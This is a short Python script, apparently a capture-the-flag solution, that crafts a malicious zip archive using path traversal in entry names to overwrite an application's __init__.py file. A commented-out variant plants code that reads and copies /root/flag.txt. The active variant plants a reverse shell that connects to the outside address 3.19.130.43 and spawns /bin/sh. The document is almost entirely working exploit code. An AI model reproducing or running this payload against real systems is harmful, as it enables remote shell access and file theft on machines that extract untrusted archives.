# READ FLAG

# import zipfile
# z_info = zipfile.ZipInfo(r"../../../../../../usr/src/app/bumblebee/__init__.py")
# z_file = zipfile.ZipFile("payload.flower", mode="w")
# z_file.writestr(z_info, """
# import os
# dir = os.popen('cat /root/flag.txt').read()
# open("/tmp/nectar/flag.txt", "w").write(dir)
# """)
# z_info.external_attr = 0777 << 16L
# z_file.close()


# REVERSE SHELL

import zipfile
# with that name file, when it has extracted, __init__.py would be in "usr/src/app/bumblebee"
z_info = zipfile.ZipInfo(r"../../../../../../usr/src/app/bumblebee/__init__.py")
z_file = zipfile.ZipFile("payload.flower", mode="w")
z_file.writestr(z_info, """
import os,pty,socket;s=socket.socket();s.connect(("3.19.130.43",11799));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/sh")
""") # This code will excute reverse shell
# that code for change mode the __init__.py file
z_info.external_attr = 0777 << 16L
z_file.close()